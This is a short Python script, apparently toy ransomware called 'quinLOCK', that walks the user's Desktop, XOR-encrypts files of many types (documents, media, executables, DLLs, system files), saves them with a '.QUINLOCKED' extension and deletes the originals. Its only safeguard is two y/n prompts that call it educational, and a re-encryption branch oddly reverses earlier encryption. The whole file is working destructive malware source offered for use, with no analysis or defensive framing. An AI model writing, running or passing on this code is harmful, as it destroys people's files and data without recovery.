import os

def encrypt_and_rename_file(file_path):
    try:
        with open(file_path, "rb") as f:
            content = f.read()

        # XOR encryption
        encrypted_content = bytes([byte ^ 0xFF for byte in content])

        new_file_path = os.path.splitext(file_path)[0] + ".QUINLOCKED"
        with open(new_file_path, "wb") as f:
            f.write(encrypted_content)

        os.remove(file_path)

        print(f"Encrypted {file_path} -> {new_file_path}")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")

def encrypt_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if file.endswith(".QUINLOCKED"):
                encrypt_and_rename_file(file_path)
            elif file != "quinLOCK.py":
                allowed_extensions = [".py", ".mp4", ".mp3", ".exe", ".bat", ".png", ".jpeg", ".txt", ".VBS", ".bash", ".docx", ".pdf", ".htm", ".html", ".ppt", ".pptx", ".wma", ".avi", ".vbs", ".dll", ".sys", ".scr", ".cmd", ".com", ".msi", ".h", ".mov", ".webm"]
                if any(file_path.endswith(extension) for extension in allowed_extensions):
                    # Encrypt the file and rename it
                    encrypt_and_rename_file(file_path)
                else:
                    print(f"Ignored {file_path}: Not a supported file type")

def main():
    confirm_first = input("This file is an example of malware and should only be used for educational purposes. Do you agree? (y/n): ")
    if confirm_first.lower() == "y":
        confirm_second = input("Are you sure you want to continue? (y/n): ")
        if confirm_second.lower() == "y":
            current_directory = os.path.join(os.path.expanduser("~"), "Desktop")  
            encrypt_files(current_directory)
        else:
            print("Script aborted. Confirmation required to proceed.")
    else:
        print("Script aborted. Confirmation required to proceed.")

if __name__ == "__main__":
    main()
